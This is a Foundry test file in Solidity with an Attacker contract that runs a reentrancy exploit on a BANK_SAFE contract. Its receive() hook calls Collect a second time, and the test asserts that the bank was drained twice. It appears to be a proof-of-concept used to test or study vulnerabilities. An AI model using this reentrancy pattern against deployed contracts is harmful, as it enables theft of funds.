
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BANK_SAFE} from "../src/BANK_SAFE.sol";
import {LogFile} from "../src/BANK_SAFE.sol";

contract TestReentrancyBANK_SAFE is Test {
    BANK_SAFE public _bank;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _bank = new BANK_SAFE();
        _bank.SetMinSum(0);
        _bank.SetLogFile(address(_logFile));
        _bank.Initialized();
        _attacker = new Attacker(address(_bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        
        vm.deal(address(_bank), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    BANK_SAFE public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public attackAmount;

    constructor(address victimAddress) {
        victim = BANK_SAFE(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;
        
        victim.Deposit{value: 2 * val}();
    }

    function attack(uint256 val) public {
        uint256 initialBankBalance = address(victim).balance;
        
        victim.Collect(val);
        
        if (attackCallCount == 2 && address(victim).balance == initialBankBalance - (2 * val)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(attackAmount);
        }
    }
}
